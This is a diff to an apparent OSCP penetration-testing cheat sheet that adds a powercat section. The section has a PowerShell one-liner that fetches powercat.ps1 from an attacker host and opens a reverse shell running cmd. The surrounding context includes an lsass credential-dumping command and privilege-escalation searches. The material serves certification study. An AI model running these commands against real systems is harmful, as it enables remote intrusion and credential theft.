@@ -131,6 +131,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [logrotten](https://github.com/0xsyr0/OSCP#logrotten)
 		- [Lsass](https://github.com/0xsyr0/OSCP#lsass)
 		- [Path Variable Hijacking](https://github.com/0xsyr0/OSCP#path-variable-hijacking)
+		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
 		- [regedit](https://github.com/0xsyr0/OSCP#regedit)
@@ -3149,6 +3150,12 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrato
 find / -perm -u=s -type f 2>/dev/null
 find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 export PATH=$(pwd):$PATH
+```
+
+#### powercat
+
+```c
+PS C:\> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
 ```
 
 #### PowerShell
